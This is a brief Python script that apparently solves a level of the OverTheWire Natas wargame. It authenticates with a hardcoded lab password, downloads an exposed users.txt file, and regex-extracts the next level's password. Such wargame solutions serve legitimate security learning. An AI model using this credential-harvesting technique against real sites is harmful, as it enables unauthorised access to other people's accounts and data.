import requests
import re
url = 'http://natas2.natas.labs.overthewire.org/files/users.txt'
user ='natas2'
passwd ='ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'

r = requests.get(url,auth=(user,passwd))
content = r.text
#print(content)
passwd = re.findall('natas3:(.*)',content)[0]

print(passwd)

